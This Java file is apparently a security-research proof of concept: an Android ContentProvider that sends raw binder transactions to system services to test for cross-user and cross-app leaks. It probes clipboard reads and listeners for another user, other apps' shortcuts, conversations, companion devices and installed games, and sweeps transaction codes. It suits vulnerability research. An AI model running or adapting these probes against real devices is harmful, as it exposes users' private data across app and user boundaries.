package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class CrossAppDeepProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        testClipboard(cursor);
        testShortcutService(cursor);
        testPeopleManager(cursor);
        testSliceManager(cursor);
        testCompanionDevice(cursor);
        testVirtualDevice(cursor);
        testSmartspace(cursor);
        testGameManager(cursor);

        return cursor;
    }

    private void testClipboard(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("clipboard");
        if (binder == null) { cursor.addRow(new Object[]{"clipboard", "no_binder"}); return; }
        String desc = "android.content.IClipboard";

        // TX=2: getPrimaryClip(String pkg, String attributionTag, int userId, int deviceId)
        // Can we read clipboard from another user?
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeString(null); // attributionTag
                data.writeInt(userId);
                data.writeInt(0); // deviceId
                binder.transact(2, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"clipboard_getPrimary_u" + userId, "SUCCESS avail=" + avail});
                    if (avail > 4) {
                        int nonNull = reply.readInt();
                        if (nonNull != 0) {
                            cursor.addRow(new Object[]{"clipboard_u" + userId + "_data", "HAS_CLIP! remaining=" + reply.dataAvail()});
                        } else {
                            cursor.addRow(new Object[]{"clipboard_u" + userId + "_data", "null_clip"});
                        }
                    }
                } else {
                    String msg = reply.readString();
                    cursor.addRow(new Object[]{"clipboard_getPrimary_u" + userId, "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"clipboard_getPrimary_u" + userId, "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=4: hasPrimaryClip(String pkg, int userId, int deviceId)
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeString(null);
                data.writeInt(userId);
                data.writeInt(0);
                binder.transact(4, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int has = reply.readInt();
                    cursor.addRow(new Object[]{"clipboard_hasPrimary_u" + userId, "has=" + has});
                } else {
                    cursor.addRow(new Object[]{"clipboard_hasPrimary_u" + userId, "Ex=" + ex});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"clipboard_hasPrimary_u" + userId, "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=7: addPrimaryClipChangedListener - monitor clipboard changes
        IBinder listener = new android.os.Binder() {
            @Override
            protected boolean onTransact(int code, Parcel d, Parcel r, int flags) {
                return true;
            }
            @Override
            public String getInterfaceDescriptor() {
                return "android.content.IOnPrimaryClipChangedListener";
            }
        };
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeStrongBinder(listener);
                data.writeString(getContext().getPackageName());
                data.writeString(null);
                data.writeInt(userId);
                data.writeInt(0);
                binder.transact(7, data, reply, 0);
                int ex = reply.readInt();
                cursor.addRow(new Object[]{"clipboard_addListener_u" + userId, ex == 0 ? "SUCCESS" : "Ex=" + ex});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"clipboard_addListener_u" + userId, "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testShortcutService(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("shortcut");
        if (binder == null) { cursor.addRow(new Object[]{"shortcut", "no_binder"}); return; }
        String desc = "android.content.pm.IShortcutService";

        // TX=19: getShareTargets(String callingPkg, IntentFilter filter, int userId)
        // Could expose other apps' share targets
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            // IntentFilter parcelable (minimal)
            data.writeInt(1); // non-null
            // IntentFilter.writeToParcel format:
            data.writeInt(0); // mActions count
            data.writeInt(0); // mCategories count
            data.writeInt(0); // mDataSchemes count
            data.writeInt(0); // mDataSchemeSpecificParts count
            data.writeInt(0); // mDataAuthorities count
            data.writeInt(0); // mDataPaths count
            data.writeInt(0); // mDataTypes count
            data.writeInt(0); // mMimeGroups
            data.writeInt(0); // priority
            data.writeInt(0); // mHasStaticPartialTypes
            data.writeInt(0); // mAutoVerify
            data.writeInt(0); // userId
            binder.transact(19, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"shortcut_getShareTargets", "SUCCESS avail=" + reply.dataAvail()});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"shortcut_getShareTargets", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"shortcut_getShareTargets", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // TX=1: getShortcuts(String callingPkg, long changedSince, String pkg, List componentNames, List ids, int flags, int userId)
        // Read another app's shortcuts
        String[] targets = {"com.google.android.apps.messaging", "com.android.chrome", "com.google.android.gm"};
        for (String target : targets) {
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName()); // callingPkg
                data.writeLong(0); // changedSince
                data.writeString(target); // target package
                data.writeInt(-1); // null componentNames list
                data.writeInt(-1); // null shortcut ids
                data.writeInt(0x000F); // FLAG_MATCH_ALL (dynamic|pinned|manifest|cached)
                data.writeInt(0); // userId
                binder.transact(1, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"shortcut_get_" + target.substring(target.lastIndexOf('.') + 1), "SUCCESS avail=" + avail});
                } else {
                    String msg = reply.readString();
                    cursor.addRow(new Object[]{"shortcut_get_" + target.substring(target.lastIndexOf('.') + 1), "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"shortcut_get_" + target.substring(target.lastIndexOf('.') + 1), "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testPeopleManager(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("people");
        if (binder == null) { cursor.addRow(new Object[]{"people", "no_binder"}); return; }
        String desc = "android.app.people.IPeopleManager";

        // TX=1: getConversations(String callingPkg, int userId)
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                binder.transact(1, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"people_getConversations_u" + userId, "SUCCESS avail=" + avail});
                } else {
                    String msg = reply.readString();
                    cursor.addRow(new Object[]{"people_getConversations_u" + userId, "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"people_getConversations_u" + userId, "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }

        // Try all TX codes
        for (int tx = 1; tx <= 10; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeInt(0);
                boolean result = binder.transact(tx, data, reply, 0);
                if (!result) {
                    cursor.addRow(new Object[]{"people_tx" + tx, "NO_SUCH_TX"});
                } else {
                    int ex = reply.readInt();
                    if (ex == 0) {
                        cursor.addRow(new Object[]{"people_tx" + tx, "SUCCESS avail=" + reply.dataAvail()});
                    } else {
                        String msg = reply.readString();
                        cursor.addRow(new Object[]{"people_tx" + tx, "Ex=" + ex + "|" + truncate(msg)});
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"people_tx" + tx, "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testSliceManager(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("slice");
        if (binder == null) { cursor.addRow(new Object[]{"slice", "no_binder"}); return; }
        String desc = "android.app.slice.ISliceManager";

        // TX=1: pinSlice(String pkg, Uri uri, SliceSpec[], IBinder token)
        // TX=5: getSliceDescendants(Uri uri) - could enumerate other apps' slice URIs
        // TX=6: getPinnedSlices(String pkg)
        for (int tx = 1; tx <= 10; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeInt(0);
                boolean result = binder.transact(tx, data, reply, 0);
                if (!result) {
                    cursor.addRow(new Object[]{"slice_tx" + tx, "NO_SUCH_TX"});
                } else {
                    int ex = reply.readInt();
                    if (ex == 0) {
                        cursor.addRow(new Object[]{"slice_tx" + tx, "SUCCESS avail=" + reply.dataAvail()});
                    } else {
                        String msg = reply.readString();
                        cursor.addRow(new Object[]{"slice_tx" + tx, "Ex=" + ex + "|" + truncate(msg)});
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"slice_tx" + tx, "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testCompanionDevice(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("companiondevice");
        if (binder == null) { cursor.addRow(new Object[]{"companion", "no_binder"}); return; }
        String desc = "android.companion.ICompanionDeviceManager";

        // TX=1: getAssociations(String callingPackage, int userId)
        // Get paired companion devices for this user / other users
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeInt(userId);
                binder.transact(1, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"companion_getAssoc_u" + userId, "SUCCESS avail=" + avail});
                    if (avail > 4) {
                        // ParceledListSlice - read count
                        int count = reply.readInt();
                        cursor.addRow(new Object[]{"companion_assocCount_u" + userId, String.valueOf(count)});
                    }
                } else {
                    String msg = reply.readString();
                    cursor.addRow(new Object[]{"companion_getAssoc_u" + userId, "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"companion_getAssoc_u" + userId, "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=2: getAllAssociationsForUser(int userId) - might bypass package check
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(userId);
                binder.transact(2, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"companion_getAllAssoc_u" + userId, "SUCCESS avail=" + avail});
                } else {
                    String msg = reply.readString();
                    cursor.addRow(new Object[]{"companion_getAllAssoc_u" + userId, "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"companion_getAllAssoc_u" + userId, "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }

        // Scan all TX codes
        for (int tx = 3; tx <= 20; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeInt(0);
                boolean result = binder.transact(tx, data, reply, 0);
                if (!result) {
                    cursor.addRow(new Object[]{"companion_tx" + tx, "NO_SUCH_TX"});
                } else {
                    int ex = reply.readInt();
                    if (ex == 0) {
                        cursor.addRow(new Object[]{"companion_tx" + tx, "SUCCESS avail=" + reply.dataAvail()});
                    } else {
                        String msg = reply.readString();
                        cursor.addRow(new Object[]{"companion_tx" + tx, "Ex=" + ex + "|" + truncate(msg)});
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"companion_tx" + tx, "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testVirtualDevice(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("virtualdevice");
        if (binder == null) { cursor.addRow(new Object[]{"virtualdevice", "no_binder"}); return; }
        String desc = "android.companion.virtual.IVirtualDeviceManager";

        // Scan all TX codes
        for (int tx = 1; tx <= 15; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeInt(0);
                boolean result = binder.transact(tx, data, reply, 0);
                if (!result) {
                    cursor.addRow(new Object[]{"vdev_tx" + tx, "NO_SUCH_TX"});
                } else {
                    int ex = reply.readInt();
                    if (ex == 0) {
                        cursor.addRow(new Object[]{"vdev_tx" + tx, "SUCCESS avail=" + reply.dataAvail()});
                    } else {
                        String msg = reply.readString();
                        cursor.addRow(new Object[]{"vdev_tx" + tx, "Ex=" + ex + "|" + truncate(msg)});
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"vdev_tx" + tx, "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testSmartspace(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("smartspace");
        if (binder == null) { cursor.addRow(new Object[]{"smartspace", "no_binder"}); return; }
        String desc = "android.app.smartspace.ISmartspaceManager";

        // Smartspace shows lock screen suggestions, calendar events, etc.
        for (int tx = 1; tx <= 8; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeInt(0);
                boolean result = binder.transact(tx, data, reply, 0);
                if (!result) {
                    cursor.addRow(new Object[]{"smartspace_tx" + tx, "NO_SUCH_TX"});
                } else {
                    int ex = reply.readInt();
                    if (ex == 0) {
                        cursor.addRow(new Object[]{"smartspace_tx" + tx, "SUCCESS avail=" + reply.dataAvail()});
                    } else {
                        String msg = reply.readString();
                        cursor.addRow(new Object[]{"smartspace_tx" + tx, "Ex=" + ex + "|" + truncate(msg)});
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"smartspace_tx" + tx, "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testGameManager(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("game");
        if (binder == null) { cursor.addRow(new Object[]{"game", "no_binder"}); return; }
        String desc = "android.app.IGameManagerService";

        // TX=1: getAvailableGameModes(String packageName, int userId) - reveals installed game packages
        String[] games = {"com.supercell.clashofclans", "com.kiloo.subwaysurf", "com.mojang.minecraftpe"};
        for (String game : games) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(game);
                data.writeInt(0);
                binder.transact(1, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    if (avail > 0) {
                        int arrLen = reply.readInt();
                        if (arrLen > 0) {
                            StringBuilder sb = new StringBuilder();
                            for (int i = 0; i < Math.min(arrLen, 5); i++) {
                                sb.append(reply.readInt()).append(",");
                            }
                            cursor.addRow(new Object[]{"game_modes_" + game.substring(game.lastIndexOf('.') + 1), "modes=" + sb});
                        } else {
                            cursor.addRow(new Object[]{"game_modes_" + game.substring(game.lastIndexOf('.') + 1), "empty"});
                        }
                    } else {
                        cursor.addRow(new Object[]{"game_modes_" + game.substring(game.lastIndexOf('.') + 1), "no_data"});
                    }
                } else {
                    cursor.addRow(new Object[]{"game_modes_" + game.substring(game.lastIndexOf('.') + 1), "Ex=" + ex});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"game_modes_" + game.substring(game.lastIndexOf('.') + 1), "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=2: getGameMode(String packageName, int userId) - oracle for app installation
        for (int tx = 1; tx <= 12; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeInt(0);
                boolean result = binder.transact(tx, data, reply, 0);
                if (!result) {
                    cursor.addRow(new Object[]{"game_tx" + tx, "NO_SUCH_TX"});
                } else {
                    int ex = reply.readInt();
                    if (ex == 0) {
                        cursor.addRow(new Object[]{"game_tx" + tx, "SUCCESS avail=" + reply.dataAvail()});
                    } else {
                        String msg = reply.readString();
                        cursor.addRow(new Object[]{"game_tx" + tx, "Ex=" + ex + "|" + truncate(msg)});
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"game_tx" + tx, "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
